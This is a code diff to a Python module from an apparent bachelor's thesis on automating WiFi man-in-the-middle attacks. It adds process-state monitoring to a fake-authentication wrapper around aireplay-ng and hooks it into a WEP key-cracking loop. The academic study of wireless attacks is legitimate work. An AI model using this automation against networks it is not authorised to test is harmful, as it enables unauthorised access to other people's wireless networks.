@@ -6,7 +6,18 @@ Automatization of MitM Attack on WiFi Networks
 Bachelor's Thesis UIFS FIT VUT
 Martin Vondracek
 2016
+
+#Implementation notes
+- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
+- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
+  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
+  to terminate.'
+  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
+  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
+  writing and reading is performed. There's only one writer and one reader per file.
+
 """
+from enum import Enum, unique
 
 from model import *
 
@@ -25,12 +36,29 @@ class FakeAuthentication(object):
     `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_
     """
 
-    def __init__(self, interface, ap, attacker_mac):
+    @unique
+    class State(Enum):
+        """
+        FakeAuthentication process states.
+        """
+        ok = 0  # Authenticated and associated successfully, sending keep-alive packet.
+        waiting_for_beacon_frame = 1  # 'Waiting for beacon frame'
+        deauthenticated = 2  # Got a deauthentication packet!
+        terminated = 100
+
+    def __init__(self, tmp_dir, interface, ap, attacker_mac):
+        self.tmp_dir = tmp_dir
         self.interface = interface
         self.ap = ap
         self.attacker_mac = attacker_mac
 
         self.process = None
+        # process' stdout, stderr for its writing
+        self.process_stdout_w = None
+        self.process_stderr_w = None
+        # process' stdout, stderr for reading
+        self.process_stdout_r = None
+        self.process_stderr_r = None
 
     def start(self, reassoc_delay=30, keep_alive_delay=5):
         """
@@ -43,10 +71,60 @@ class FakeAuthentication(object):
                '-a', self.ap.bssid,
                '-h', self.attacker_mac,
                self.interface]
-        self.process = subprocess.Popen(cmd)
-        logging.debug('FakeAuthentication started')
+        # temp files (write, read) for stdout and stderr, line buffering
+        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stdout', dir=self.tmp_dir)
+        self.process_stdout_r = open(self.process_stdout_w.name, 'r')
+
+        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stderr', dir=self.tmp_dir)
+        self.process_stderr_r = open(self.process_stderr_w.name, 'r')
+
+        # start process
+        self.process = subprocess.Popen(cmd,
+                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
+                                        universal_newlines=True)
+        logging.debug('FakeAuthentication started; ' +
+                      'stdout @ ' + self.process_stdout_w.name +
+                      ', stderr @ ' + self.process_stderr_w.name)
+
+    def check_state(self):
+        """
+        Check state of running process.
+        Read new output from stdout and stderr, check if process is alive and announce state.
+        :return: state of the process
+        """
+        state = None
+        # check every added line in stdout
+        for line in self.process_stdout_r:
+            if state == FakeAuthentication.State.deauthenticated:
+                # If deauthentication was detected, read the rest of added lines. In case of deauthentication, we do not
+                # care about any following successful association.
+                continue
+            elif 'Waiting for beacon frame' in line:
+                state = FakeAuthentication.State.waiting_for_beacon_frame
+            elif 'Association successful' in line:
+                state = FakeAuthentication.State.ok
+            elif 'Got a deauthentication packet!' in line:
+                state = FakeAuthentication.State.deauthenticated
+                logging.debug('Got a deauthentication packet!')
+                return state
+
+        # check stderr
+        # TODO (xvondr20) Does 'aireplay-ng --fakeauth' ever print anything to stderr?
+        assert self.process_stderr_r.read() == ''
+
+        # is process running?
+        if self.process.poll() is None:
+            state = FakeAuthentication.State.terminated
+
+        return state
 
     def stop(self):
+        """
+        Stop running process.
+        If the process is stopped or already finished, exitcode is returned.
+        In the case that there was not any process, nothing happens.
+        :return:
+        """
         if self.process:
             exitcode = self.process.poll()
             if exitcode is None:
@@ -58,6 +136,29 @@ class FakeAuthentication(object):
 
             self.process = None
             return exitcode
+
+    def clean(self):
+        """
+        Clean after running process.
+        Running process is stopped, temp files are closed and deleted,
+        :return:
+        """
+        logging.debug('FakeAuthentication clean')
+        # if the process is running, stop it and then clean
+        if self.process:
+            self.stop()
+        # close opened files
+        self.process_stdout_r.close()
+        self.process_stdout_r = None
+
+        self.process_stdout_w.close()
+        self.process_stdout_w = None
+
+        self.process_stderr_r.close()
+        self.process_stderr_r = None
+
+        self.process_stderr_w.close()
+        self.process_stderr_w = None
 
 
 class ArpReplay(object):
@@ -170,6 +271,7 @@ class WepAttacker(object):
     """
     Main class providing attack on WEP secured network.
     """
+
     def __init__(self, dir_network_path, ap, if_mon):
         if not os.path.isdir(dir_network_path):
             raise NotADirectoryError('Provided dir_network_path is not a directory.')
@@ -188,8 +290,11 @@ class WepAttacker(object):
             capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
             capturer.start(self.ap)
 
-            fake_authentication = FakeAuthentication(interface=self.if_mon, ap=self.ap, attacker_mac=self.if_mon_mac)
+            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.if_mon, ap=self.ap,
+                                                     attacker_mac=self.if_mon_mac)
             fake_authentication.start()
+            time.sleep(1)
+            fake_authentication.check_state()  # is fakeauth OK?
 
             arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
             arp_replay.start(source_mac=self.if_mon_mac)
@@ -206,6 +311,7 @@ class WepAttacker(object):
 
             while not cracker.has_key():
                 time.sleep(5)
+                fake_authentication.check_state()  # is fakeauth OK?
                 iv_curr = capturer.get_iv_sum()
                 if iv != iv_curr:
                     iv = iv_curr
@@ -214,3 +320,4 @@ class WepAttacker(object):
             capturer.stop()
             arp_replay.stop()
             fake_authentication.stop()
+            fake_authentication.clean()
